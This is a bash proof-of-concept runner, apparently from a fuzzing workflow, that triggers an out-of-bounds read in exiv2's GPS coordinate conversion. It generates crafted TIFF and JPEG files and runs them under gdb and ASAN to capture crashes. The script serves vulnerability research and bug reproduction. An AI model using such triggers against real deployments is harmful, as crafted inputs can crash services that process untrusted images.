#!/bin/bash
# PoC runner for VULN 001: OOB Read via .front() on empty GPS Ref string
# in Converter::cnvExifGPSCoord() (src/convert.cpp:836)
#
# Trigger: exiv2 -eX <file>  (extract to XMP sidecar)
#   -> Action::Extract::run() -> metacopy()
#   -> XmpSidecar::writeMetadata() -> copyExifToXmp()
#   -> Converter::cnvToXmp() -> cnvExifGPSCoord()
#   -> refPos->toString().front()  [UB: front() on empty std::string]
#
# ASAN build detects this via __glibcxx_assert inside std::string::front()
# which calls __replacement_assert -> abort()

set -uo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/exiv2/build_test/bin/exiv2
OUTDIR="$(dirname "$0")"

echo "=== Generating test files ==="
python3 vuln_001_gen.py

echo ""
echo "=== Primary trigger: exiv2 -eX (extract XMP sidecar) ==="
rm -f "${OUTDIR}/vuln_001_input.xmp"
# Use GDB to get backtrace even if ASAN suppresses output
gdb -batch -ex "run" -ex "bt" \
  --args "$BIN" -eX vuln_001_input.tiff 2>&1 || true

echo ""
echo "=== Fallback trigger: exiv2 pr ==="
ASAN_OPTIONS="abort_on_error=0:print_stacktrace=1" \
  "$BIN" pr vuln_001_input.tiff 2>&1 || true

echo ""
echo "=== Fallback trigger: exiv2 -pa (print all) ==="
ASAN_OPTIONS="abort_on_error=0:print_stacktrace=1" \
  "$BIN" -pa vuln_001_input.tiff 2>&1 || true

echo ""
echo "=== JPEG variant: exiv2 -eX on JPEG ==="
rm -f "${OUTDIR}/vuln_001_input.jpg.xmp" "${OUTDIR}/vuln_001_input.xmp" 2>/dev/null || true
gdb -batch -ex "run" -ex "bt" \
  --args "$BIN" -eX vuln_001_input.jpg 2>&1 || true

echo "=== Done ==="
